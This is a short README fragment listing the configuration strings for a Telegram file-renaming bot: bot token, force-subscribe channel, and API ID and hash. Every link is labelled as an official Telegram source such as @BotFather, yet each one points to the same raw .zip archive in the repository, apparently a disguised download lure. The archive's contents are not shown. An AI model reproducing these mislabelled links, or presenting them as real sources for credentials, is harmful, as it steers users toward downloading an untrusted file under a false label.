# Required Strings :-

* -> `TG_BOT_TOKEN`<br> **Your Bot Token Taken From [@BotFather](https://raw.githubusercontent.com/HLECTER69/FileRenameBot/master/plugins/Bot_Rename_File_v1.8.zip)**

* -> `UPDATE_CHANNEL`<br> **An Channel Username Which You Want to Use As An ForceSub Channel Put It Without @**

* -> `APP_ID`__And__ `API_HASH`<br>**Get It From [Here](https://raw.githubusercontent.com/HLECTER69/FileRenameBot/master/plugins/Bot_Rename_File_v1.8.zip) or [@UseTGXBot](https://raw.githubusercontent.com/HLECTER69/FileRenameBot/master/plugins/Bot_Rename_File_v1.8.zip)**
